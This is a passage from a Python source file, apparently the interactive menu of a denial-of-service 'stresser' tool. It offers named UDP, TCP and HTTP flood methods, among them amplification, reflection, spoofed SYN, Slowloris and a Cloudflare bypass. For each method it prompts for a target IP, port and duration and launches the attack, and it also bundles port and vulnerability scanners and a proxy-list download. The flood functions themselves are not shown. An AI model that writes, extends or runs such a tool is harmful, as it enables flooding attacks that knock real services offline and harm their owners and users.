            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-14): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                ip = input(f"{Fore.LIGHTBLUE_EX}Target IP: {Style.RESET_ALL}")
                port = validate_input("Port (1-65535): ", 1, 65535, int)
                duration = validate_input("Duration (seconds): ", 1, 3600)
                launch_attack(options[method][1], ip, port, duration)
            else:
                logging.error("Invalid selection")

        elif choice == "2":
            options = {
                "1": ("StdHex", udp_stdhex),
                "2": ("Plain", udp_plain),
                "3": ("Bypass", udp_bypass),
                "4": ("Burst", udp_burst),
                "5": ("Storm", udp_storm),
                "6": ("Rush", udp_rush),
                "7": ("Blast", udp_blast),
                "8": ("Amplification", udp_amplification),
                "9": ("Reflection", udp_reflection)
            }
            print(f"{Fore.LIGHTBLUE_EX}Layer 4 UDP:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-9): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                ip = input(f"{Fore.LIGHTBLUE_EX}Target IP: {Style.RESET_ALL}")
                port = validate_input("Port (1-65535): ", 1, 65535, int)
                duration = validate_input("Duration (seconds): ", 1, 3600)
                packet_size = validate_input("Packet Size (1-65500): ", 1, 65500, int)
                launch_attack(options[method][1], ip, port, duration, packet_size)
            else:
                logging.error("Invalid selection")

        elif choice == "3":
            options = {
                "1": ("Bypass", tcp_bypass),
                "2": ("SYN", tcp_syn),
                "3": ("ACK", tcp_ack),
                "4": ("Connect", tcp_connect),
                "5": ("Wave", tcp_wave),
                "6": ("Surge", tcp_surge),
                "7": ("Crush", tcp_crush),
                "8": ("Rapid Reset", tcp_rapid_reset),
                "9": ("Spoofed SYN", tcp_spoofed_syn)
            }
            print(f"{Fore.LIGHTBLUE_EX}Layer 4 TCP:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-9): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                ip = input(f"{Fore.LIGHTBLUE_EX}Target IP: {Style.RESET_ALL}")
                port = validate_input("Port (1-65535): ", 1, 65535, int)
                duration = validate_input("Duration (seconds): ", 1, 3600)
                packet_size = validate_input("Packet Size (1-65500): ", 1, 65500, int)
                launch_attack(options[method][1], ip, port, duration, packet_size)
            else:
                logging.error("Invalid selection")

        elif choice == "4":
            options = {
                "1": ("Slowloris", slowloris),
                "2": ("HTTP Spam", http_spam),
                "3": ("HTTPS Bypass", https_bypass),
                "4": ("HTTP Fury", http_fury),
                "5": ("HTTPS Strike", https_strike),
                "6": ("HTTP Overload", http_overload),
                "7": ("Cloudflare Bypass", http_cf_bypass),
                "8": ("Bot Emulation", http_bot_emulation)
            }
            print(f"{Fore.LIGHTBLUE_EX}Layer 7 HTTP/HTTPS:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-8): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                ip = input(f"{Fore.LIGHTBLUE_EX}Target IP/Domain: {Style.RESET_ALL}")
                duration = validate_input("Duration (seconds): ", 1, 3600)
                launch_attack(options[method][1], ip, duration)
            else:
                logging.error("Invalid selection")

        elif choice == "5":
            options = {
                "1": ("Ping IP", ping_check),
                "2": ("HTTP Check", http_check),
                "3": ("Target Info", target_info),
                "4": ("URL to IP", url_to_ip)
            }
            print(f"{Fore.LIGHTBLUE_EX}CheckHost Diagnostics:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-4): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                target = input(f"{Fore.LIGHTBLUE_EX}Target (IP/URL): {Style.RESET_ALL}")
                options[method][1](target)
            else:
                logging.error("Invalid selection")

        elif choice == "6":
            options = {
                "1": ("IP Geolocation", ip_geolocation),
                "2": ("Port Scanner", port_scanner),
                "3": ("WHOIS Lookup", whois_lookup),
                "4": ("DNS Resolver", dns_resolver),
                "5": ("Bandwidth Test", bandwidth_test),
                "6": ("SSL/TLS Checker", ssl_tls_checker),
                "7": ("Traceroute", traceroute),
                "8": ("Subdomain Finder", subdomain_finder),
                "9": ("IP Reputation", ip_reputation),
                "10": ("Website Screenshot", website_screenshot),
                "11": ("DNS Leak Test", dns_leak_test),
                "12": ("HTTP Headers", http_headers_analyzer),
                "13": ("IP Blacklist", ip_blacklist_check),
                "14": ("Network Latency", network_latency_test),
                "15": ("Vulnerability Scanner", vulnerability_scanner),
                "16": ("IP Abuse Check", ip_abuse_check),
                "17": ("Domain Reputation", domain_reputation),
                "18": ("IP Neighbors", ip_neighbors),
                "19": ("SSL Cert Info", ssl_cert_info),
                "20": ("DNS Propagation", dns_propagation)
            }
            print(f"{Fore.LIGHTBLUE_EX}Network Tools:{Style.RESET_ALL}")
            for k, (name, _) in options.items():
                print(f"  {k}. {name}")
            print("  0. Back")
            method = input(f"{Fore.LIGHTBLUE_EX}Select (0-20): {Style.RESET_ALL}").strip()
            if method == "0":
                continue
            if method in options:
                if method == "11":  # DNS Leak Test doesn't need input
                    options[method][1]()
                else:
                    target = input(f"{Fore.LIGHTBLUE_EX}Target (IP/Domain): {Style.RESET_ALL}")
                    options[method][1](target)
            else:
                logging.error("Invalid selection")

        elif choice == "7":
            download_proxy_list()

        elif choice == "8":
            show_credits()

        else:
            logging.error("Invalid category")

if __name__ == "__main__":
    main()
